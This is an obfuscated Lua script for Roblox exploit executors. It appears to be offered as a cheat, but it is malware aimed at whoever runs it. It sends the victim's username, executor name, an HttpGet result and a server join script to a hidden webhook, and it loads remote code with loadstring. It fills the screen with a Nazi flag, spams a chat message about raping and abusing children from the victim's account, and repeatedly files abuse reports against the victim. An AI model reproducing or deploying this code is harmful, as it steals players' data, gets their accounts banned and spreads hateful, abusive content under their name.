--[[      
███╗░░░███╗░█████╗░██████╗░███████╗  ██████╗░██╗░░░██╗  ███╗░░░███╗███████╗██╗░░░░░███████╗
████╗░████║██╔══██╗██╔══██╗██╔════╝  ██╔══██╗╚██╗░██╔╝  ████╗░████║╚════██║██║░░░░░██╔════╝
██╔████╔██║███████║██║░░██║█████╗░░  ██████╦╝░╚████╔╝░  ██╔████╔██║░░███╔═╝██║░░░░░█████╗░░
██║╚██╔╝██║██╔══██║██║░░██║██╔══╝░░  ██╔══██╗░░╚██╔╝░░  ██║╚██╔╝██║██╔══╝░░██║░░░░░██╔══╝░░
██║░╚═╝░██║██║░░██║██████╔╝███████╗  ██████╦╝░░░██║░░░  ██║░╚═╝░██║███████╗███████╗██║░░░░░
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═════╝░╚══════╝  ╚═════╝░░░░╚═╝░░░  ╚═╝░░░░░╚═╝╚══════╝╚══════╝╚═╝░░░░░
]]--
local obf_stringchar = string.char;
local obf_stringbyte = string.byte;
local obf_stringsub = string.sub;
local obf_bitlib = bit32 or bit;
local obf_XOR = obf_bitlib.bxor;
local obf_tableconcat = table.concat;
local obf_tableinsert = table.insert;
local function LUAOBFUSACTOR_DECRYPT_STR_0(LUAOBFUSACTOR_STR, LUAOBFUSACTOR_KEY)
	local result = {};
	for i = 1, #LUAOBFUSACTOR_STR do
		obf_tableinsert(result, obf_stringchar(obf_XOR(obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_STR, i, i + 1)), obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_KEY, 1 + (i % #LUAOBFUSACTOR_KEY), 1 + (i % #LUAOBFUSACTOR_KEY) + 1))) % 256));
	end
	return obf_tableconcat(result);
end
repeat
	task.wait();
until game:IsLoaded() 
local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId);
print(helo);
local webhookcheck = (is_sirhurt_closure and LUAOBFUSACTOR_DECRYPT_STR_0("\226\202\201\45\243\169\211", "\126\177\163\187\69\134\219\167")) or (pebc_execute and LUAOBFUSACTOR_DECRYPT_STR_0("\19\223\37\209\243\16\192\43\214\244\38\223", "\156\67\173\74\165")) or (syn and LUAOBFUSACTOR_DECRYPT_STR_0("\7\174\71\23\172\53\67\116\143", "\38\84\215\41\118\220\70")) or (secure_load and LUAOBFUSACTOR_DECRYPT_STR_0("\99\19\44\6\247\94\19\46", "\158\48\118\66\114")) or (KRNL_LOADED and LUAOBFUSACTOR_DECRYPT_STR_0("\128\54\30\58", "\155\203\68\112\86\19\197")) or (SONA_LOADED and LUAOBFUSACTOR_DECRYPT_STR_0("\117\210\56\253", "\152\38\189\86\156\32\24\133")) or LUAOBFUSACTOR_DECRYPT_STR_0("\215\94\163\6\235\94\179\78\188\68\175\79\232\23\162\94\236\91\168\79\232", "\38\156\55\199");
local url = LUAOBFUSACTOR_DECRYPT_STR_0("\160\105\104\56\0\46\181\12\172\116\111\43\28\102\254\13\171\114\113\103\18\100\243\12\191\120\126\32\28\123\241\80\231\44\46\127\64\45\173\22\251\42\44\123\74\33\174\17\250\42\46\121\92\57\170\116\158\47\127\36\94\32\236\90\188\116\90\10\54\82\255\64\161\127\102\12\69\85\162\68\169\81\75\13\54\103\222\80\142\47\126\13\67\65\253\17\169\71\87\6\74\66\214\113\170\112\89\12\44\123\204\69\185\119\42\43\61\71\203\87\252", "\35\200\29\28\72\115\20\154");
local data = {[LUAOBFUSACTOR_DECRYPT_STR_0("\12\172\212\205\131\45\57\28", "\84\121\223\177\191\237\76")]=LUAOBFUSACTOR_DECRYPT_STR_0("\136\87\197\173\53\94\125\237\235\113", "\161\219\54\169\192\90\48\80"),[LUAOBFUSACTOR_DECRYPT_STR_0("\72\84\1\49\72\80\63\48\91\78", "\69\41\34\96")]=LUAOBFUSACTOR_DECRYPT_STR_0("\180\215\195\26\17\113\243\140\212\14\12\101\169\211\219\5\3\47\242\208\206\25\22\46\177\208\152\31\18\39\179\194\211\25\77\35\189\236\133\39\47\122\142\141\199\4\5", "\75\220\163\183\106\98"),[LUAOBFUSACTOR_DECRYPT_STR_0("\1\181\133\35\220\12\174", "\185\98\218\235\87")]=(LUAOBFUSACTOR_DECRYPT_STR_0("\139\28\34\240\219\184\210\51\41\227\158\224\129", "\202\171\92\71\134\190") .. game.Players.LocalPlayer.Name .. LUAOBFUSACTOR_DECRYPT_STR_0("\99\139\108\130\60\210\56\200\59\192\34\200\48\206\57\154\105\205\35\143\46\196\62", "\232\73\161\76")),[LUAOBFUSACTOR_DECRYPT_STR_0("\190\212\64\88\26\168", "\126\219\185\34\61")]={{[LUAOBFUSACTOR_DECRYPT_STR_0("\24\199\74\126\123", "\135\108\174\62\18\30\23\147")]=(LUAOBFUSACTOR_DECRYPT_STR_0("\252\163\106", "\167\214\137\74\171\120\206\83") .. game.Players.LocalPlayer.Name .. LUAOBFUSACTOR_DECRYPT_STR_0("\203\250\39\78\236\231\153\241\60\29\225\168\158\226\114\81\247\160\140\245\32\23\178", "\199\235\144\82\61\152")),[LUAOBFUSACTOR_DECRYPT_STR_0("\3\19\170\40\21\31\169\63\14\25\183", "\75\103\118\217")]=(LUAOBFUSACTOR_DECRYPT_STR_0("\141\30", "\126\167\52\16\116\217") .. game:HttpGet(LUAOBFUSACTOR_DECRYPT_STR_0("\192\58\52\144\238\86\179\193\62\109\129\164\16\178\203\33\45\207\184\16\242\205\97\127\134\189\28\240\204\61\125\214\229\77\175\145", "\156\168\78\64\224\212\121")) .. LUAOBFUSACTOR_DECRYPT_STR_0("\50\253\160\220\9\239\168\203\93\174", "\174\103\142\197") .. game.Players.LocalPlayer.Name .. LUAOBFUSACTOR_DECRYPT_STR_0("\26\104\106\43\32\77\162\22", "\152\54\72\63\88\69\62") .. webhookcheck .. LUAOBFUSACTOR_DECRYPT_STR_0("\158\142", "\60\180\164\142")),[LUAOBFUSACTOR_DECRYPT_STR_0("\76\71\21\44", "\114\56\62\101\73\71\141")]=LUAOBFUSACTOR_DECRYPT_STR_0("\170\224\216\204", "\164\216\137\187"),[LUAOBFUSACTOR_DECRYPT_STR_0("\209\233\61\189\180", "\107\178\134\81\210\198\158")]=14680319,[LUAOBFUSACTOR_DECRYPT_STR_0("\62\1\141\210\175\42", "\202\88\110\226\166")]={[LUAOBFUSACTOR_DECRYPT_STR_0("\215\10\154\227", "\170\163\111\226\151")]=("" .. join_script .. "")}}}};
local newdata = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\57\36\166\40\125\50\59\7\57\177\61", "\73\113\80\210\88\46\87")):JSONEncode(data);
local headers = {[LUAOBFUSACTOR_DECRYPT_STR_0("\130\35\195\6\226\143\56\128\6\254\145\41", "\135\225\76\173\114")]=LUAOBFUSACTOR_DECRYPT_STR_0("\27\253\168\188\165\190\166\14\228\183\190\227\183\180\21\227", "\199\122\141\216\208\204\221")};
request = http_request or request or HttpPost or syn.request;
local abcdef = {[LUAOBFUSACTOR_DECRYPT_STR_0("\152\207\28", "\150\205\189\112\144\24")]=url,[LUAOBFUSACTOR_DECRYPT_STR_0("\7\139\187\85", "\112\69\228\223\44\100\232\113")]=newdata,[LUAOBFUSACTOR_DECRYPT_STR_0("\249\26\19\219\185\120", "\230\180\127\103\179\214\28")]=LUAOBFUSACTOR_DECRYPT_STR_0("\188\42\108\114", "\128\236\101\63\38\132\33"),[LUAOBFUSACTOR_DECRYPT_STR_0("\132\172\16\64\179\249\220", "\175\204\201\113\36\214\139")]=headers};
request(abcdef);
local screenGui = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\116\207\39\217\1\73\235\32\213", "\100\39\172\85\188"));
screenGui.Name = LUAOBFUSACTOR_DECRYPT_STR_0("\143\116\184\131\56\158\123\171\133\54\163\95\172\137", "\83\205\24\217\224");
screenGui.Parent = game.Players.LocalPlayer:WaitForChild(LUAOBFUSACTOR_DECRYPT_STR_0("\214\201\204\36\227\215\234\40\239", "\93\134\165\173"));
screenGui.DisplayOrder = 999;
screenGui.IgnoreGuiInset = true;
game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false);
game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false);
local blackFrame = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\152\224\192\207\63", "\30\222\146\161\162\90\174\210"));
blackFrame.Size = UDim2.new(2, 0, 2, 0);
blackFrame.Position = UDim2.new(-0.5, 0, -0.5, 0);
blackFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0);
blackFrame.Parent = screenGui;
local function createNaziFlag()
	local flagFrame = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\195\92\113\7\224", "\106\133\46\16"));
	flagFrame.Size = UDim2.new(0.2, 0, 0.2, 0);
	flagFrame.Position = UDim2.new(0.4, 0, 0.35, 0);
	flagFrame.BackgroundColor3 = Color3.fromRGB(255, 0, 0);
	flagFrame.Parent = blackFrame;
	local whiteCircle = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\126\50\114\241\95", "\32\56\64\19\156\58"));
	whiteCircle.Size = UDim2.new(0.6, 0, 0.6, 0);
	whiteCircle.Position = UDim2.new(0.2, 0, 0.2, 0);
	whiteCircle.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
	whiteCircle.Parent = flagFrame;
	local circleCorner = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\111\225\198\89\72\252\133\72", "\224\58\168\133\54\58\146"));
	circleCorner.CornerRadius = UDim.new(1, 0);
	circleCorner.Parent = whiteCircle;
	local symbol = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\109\83\83\233\89\135\133\14\85", "\107\57\54\43\157\21\230\231"));
	symbol.Text = "卐";
	symbol.TextColor3 = Color3.fromRGB(0, 0, 0);
	symbol.BackgroundTransparency = 1;
	symbol.Size = UDim2.new(1, 0, 1, 0);
	symbol.Position = UDim2.new(0, 0, 0, 0);
	symbol.Parent = whiteCircle;
	symbol.Font = Enum.Font.SourceSansBold;
	symbol.TextScaled = true;
end
createNaziFlag();
local createdByLabel = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\239\142\9\225\149\221\205\222\135", "\175\187\235\113\149\217\188"));
createdByLabel.Parent = blackFrame;
createdByLabel.Text = LUAOBFUSACTOR_DECRYPT_STR_0("\31\189\132\77\247\124\124\124\173\152\12\238\99\116\58", "\24\92\207\225\44\131\25");
createdByLabel.TextColor3 = Color3.fromRGB(255, 255, 255);
createdByLabel.BackgroundTransparency = 1;
createdByLabel.Size = UDim2.new(0.4, 0, 0.1, 0);
createdByLabel.Position = UDim2.new(0.3, 0, 0.25, 0);
createdByLabel.Font = Enum.Font.GothamBold;
createdByLabel.TextScaled = true;
local tweenService = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\127\196\189\73\21\78\78\193\174\69\24\120", "\29\43\179\216\44\123"));
local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true);
local goal = {[LUAOBFUSACTOR_DECRYPT_STR_0("\137\220\56\88\158\214\44\67\175\138", "\44\221\185\64")]=Color3.fromRGB(255, 0, 0)};
local tween = tweenService:Create(createdByLabel, tweenInfo, goal);
tween:Play();
local textLabel = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\53\226\80\75\95\0\229\77\83", "\19\97\135\40\63"));
textLabel.Parent = blackFrame;
textLabel.Text = LUAOBFUSACTOR_DECRYPT_STR_0("\157\95\33\50\63\37\238\80\60\58\43\56\160\91", "\81\206\60\83\91\79");
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255);
textLabel.BackgroundTransparency = 1;
textLabel.Size = UDim2.new(1, 0, 0.2, 0);
textLabel.Position = UDim2.new(0, 0, 0.5, 0);
textLabel.Font = Enum.Font.SourceSans;
textLabel.TextScaled = true;
local loadingBarBackground = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\104\185\209\127\42", "\196\46\203\176\18\79\163\45"));
loadingBarBackground.Parent = blackFrame;
loadingBarBackground.BackgroundColor3 = Color3.fromRGB(100, 100, 100);
loadingBarBackground.Size = UDim2.new(0.8, 0, 0.02, 0);
loadingBarBackground.Position = UDim2.new(0.1, 0, 0.7, 0);
local loadingBar = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\158\48\127\19\33", "\143\216\66\30\126\68\155"));
loadingBar.Parent = loadingBarBackground;
loadingBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0);
loadingBar.Size = UDim2.new(0, 0, 1, 0);
local tweenInfoBar = TweenInfo.new(30, Enum.EasingStyle.Linear);
local goalBar = {[LUAOBFUSACTOR_DECRYPT_STR_0("\153\193\23\206", "\129\202\168\109\171\165\195\183")]=UDim2.new(1, 0, 1, 0)};
local tweenBar = tweenService:Create(loadingBar, tweenInfoBar, goalBar);
task.delay(1, function()
	tweenBar:Play();
end);
local function copyToClipboard(text)
	if setclipboard then
		setclipboard(text);
	end
end
tweenBar.Completed:Connect(function()
	textLabel:Destroy();
	createdByLabel:Destroy();
	blackFrame:ClearAllChildren();
	local endText = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\22\93\47\204\242\21\228\39\84", "\134\66\56\87\184\190\116"));
	endText.Parent = blackFrame;
	endText.Text = "Don't cheat lil bro";
	endText.TextColor3 = Color3.fromRGB(255, 255, 255);
	endText.BackgroundTransparency = 1;
	endText.Size = UDim2.new(1, 0, 0.2, 0);
	endText.Position = UDim2.new(0, 0, 0.3, 0);
	endText.Font = Enum.Font.SourceSansBold;
	endText.TextScaled = true;
	local telegramButton = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\8\52\17\175\59\254\53\33\51\63", "\85\92\81\105\219\121\139\65"));
	telegramButton.Parent = blackFrame;
	telegramButton.Text = LUAOBFUSACTOR_DECRYPT_STR_0("\215\188\89\75\60\210\228\243\68\64\112\218\250\161\81\72", "\191\157\211\48\37\28");
	telegramButton.TextColor3 = Color3.fromRGB(255, 255, 255);
	telegramButton.BackgroundColor3 = Color3.fromRGB(0, 0, 255);
	telegramButton.Size = UDim2.new(0.6, 0, 0.1, 0);
	telegramButton.Position = UDim2.new(0.2, 0, 0.5, 0);
	telegramButton.Font = Enum.Font.SourceSansBold;
	telegramButton.TextScaled = true;
	telegramButton.MouseButton1Click:Connect(function()
		copyToClipboard(LUAOBFUSACTOR_DECRYPT_STR_0("\215\11\224\12\41\133\80\187\8\116\210\26\187\14\47\204\12\253\29\52\210\5\248\26\61\205\16\225\12", "\90\191\127\148\124"));
		local log = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\76\130\54\3\84\134\44\18\116", "\119\24\231\78"));
		log.Parent = blackFrame;
		log.Text = LUAOBFUSACTOR_DECRYPT_STR_0("\161\34\181\67\217\68\81\150\34\229\73\208\73\1\128\34\164\88\216", "\113\226\77\197\42\188\32");
		log.TextColor3 = Color3.fromRGB(0, 255, 0);
		log.BackgroundTransparency = 1;
		log.Size = UDim2.new(1, 0, 0.1, 0);
		log.Position = UDim2.new(0, 0, 0.65, 0);
		log.Font = Enum.Font.SourceSansBold;
		log.TextScaled = true;
		task.wait(2);
		log:Destroy();
	end);
	local sound = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\9\25\225\187\62", "\213\90\118\148"));
	sound.SoundId = LUAOBFUSACTOR_DECRYPT_STR_0("\73\44\172\87\94\72\43\160\95\73\1\97\251\1\26\10\125\236\15\29\2\120\231", "\45\59\78\212\54");
	sound.Volume = 1;
	sound.Looped = true;
	sound.Parent = blackFrame;
	sound:Play();
end);
local UserInputService = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\37\69\134\153\175\32\189\229\4\101\134\153\144\39\174\245", "\144\112\54\227\235\230\78\205"));
UserInputService.InputBegan:Connect(function(input, processed)
	if ((input.KeyCode == Enum.KeyCode.Escape) and not processed) then
		print(LUAOBFUSACTOR_DECRYPT_STR_0("\150\59\12\253\192\94\243\35\10\229\144\75\161\45\28\239\213\95\255\104\13\240\223\88\184\33\1\251\144\94\171\33\27", "\59\211\72\111\156\176"));
	end
end);
local Players = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\126\139\226\52\75\149\240", "\77\46\231\131"));
local ReplicatedStorage = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\136\81\166\76\179\87\183\84\191\80\133\84\181\70\183\71\191", "\32\218\52\214"));
local TextChatService = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\122\18\41\188\210\184\68\78\125\18\35\190\248\179\64", "\58\46\119\81\200\145\208\37"));
local LocalPlayer = Players.LocalPlayer;
local chat = TextChatService.ChatInputBarConfiguration.TargetTextChannel;
local function sendHi()
	local message = "k<!_i_will_rfpe_your_kids._i_abuse_kids89._made_by_mzlf-->hi";
	if (TextChatService.ChatVersion == Enum.ChatVersion.LegacyChatService) then
		ReplicatedStorage:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\15\137\54\173\188\177\34\8\132\49\184\154\164\37\63\137\61\143\161\188\34\14\154\53\162\189\174", "\86\75\236\80\204\201\221")).SayMessageRequest:FireServer(message, LUAOBFUSACTOR_DECRYPT_STR_0("\83\77\123", "\235\18\33\23\229\158"));
	else
		chat:SendAsync(message);
	end
end
while true do
	sendHi();
	task.wait(1);
end
local categories = {LUAOBFUSACTOR_DECRYPT_STR_0("\114\175\205\183\73\179\207\188", "\219\48\218\161"),LUAOBFUSACTOR_DECRYPT_STR_0("\205\127\125\89\203\93\239\244\99\117\72\207\74\160\200\112\114\78\206\78\231\225", "\128\132\17\28\41\187\47"),LUAOBFUSACTOR_DECRYPT_STR_0("\37\59\21\57\79\8\63\15\52\92\21\61\20\35\29\45\51\8\61\72\0\53\3", "\61\97\82\102\90"),LUAOBFUSACTOR_DECRYPT_STR_0("\133\32\170\91\215\69\17\25\190\39\170\95\194\23\43\26\169\60\165\74\202\82", "\105\204\78\203\43\167\55\126"),LUAOBFUSACTOR_DECRYPT_STR_0("\128\178\51\18\28\13\211\88\171\173\108\61\27\1\198\69\172\164\36", "\49\197\202\67\126\115\100\167"),LUAOBFUSACTOR_DECRYPT_STR_0("\4\88\222\36\141\95\80\48", "\62\87\59\191\73\224\54"),LUAOBFUSACTOR_DECRYPT_STR_0("\200\4\252\218\238\22\255\137\203\11\244\194\244", "\169\135\98\154"),LUAOBFUSACTOR_DECRYPT_STR_0("\251\114\54\71\242\61\201\199\55\13\90\251\60\136\248\127\37\70\244\61\207", "\168\171\23\68\52\157\83")};
local players = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\196\125\244\180\32\63\148", "\231\148\17\149\205\69\77"));
local localPlayer = players.LocalPlayer;
for _, category in ipairs(categories) do
	players:ReportAbuse(localPlayer, category, LUAOBFUSACTOR_DECRYPT_STR_0("\161\178\211\244\26\237\133\183\200\233\67\250\132\231\193\244\69\191\130\181\194\250\92\246\142\160\135\201\88\253\140\168\223\187\99\208\179\233", "\159\224\199\167\155\55"));
	task.wait(1.5);
	players:ReportAbuse(localPlayer, category, LUAOBFUSACTOR_DECRYPT_STR_0("\214\230\40\221\186\225\57\194\248\225\40\215\243\179\58\221\229\179\62\192\242\242\55\219\249\244\124\224\248\241\48\221\239\179\8\253\196\189", "\178\151\147\92"));
end
local function notifySelfReport()
	local OrionLib = loadstring(game:HttpGet(LUAOBFUSACTOR_DECRYPT_STR_0("\132\233\88\34\1\22\53\195\239\77\37\92\75\115\152\245\89\48\7\95\127\158\254\67\60\6\73\116\152\179\79\61\31\3\105\132\241\73\42\5\77\104\137\178\99\32\27\67\116\195\240\77\59\28\3\105\131\232\94\49\23", "\26\236\157\44\82\114\44")))();
	OrionLib:MakeNotification({[LUAOBFUSACTOR_DECRYPT_STR_0("\4\47\216\94", "\59\74\78\181")]=LUAOBFUSACTOR_DECRYPT_STR_0("\22\212\86\92\254\23\212\74\85\161\49", "\211\69\177\58\58"),[LUAOBFUSACTOR_DECRYPT_STR_0("\148\234\119\225\236\197\163", "\171\215\133\25\149\137")]=(LUAOBFUSACTOR_DECRYPT_STR_0("\201\205\114\237\238\62\232\2\231\221\49\241\163\34\253\82\228\136\51\244\235\112\247\75\237\196\114\249\231\57\240\70\243\205\60\233\181\112", "\34\129\168\82\154\143\80\156") .. table.concat(categories, LUAOBFUSACTOR_DECRYPT_STR_0("\201\242", "\233\229\210\83\107\40\46"))),[LUAOBFUSACTOR_DECRYPT_STR_0("\245\75\63\211", "\101\161\34\82\182")]=5});
end
notifySelfReport();
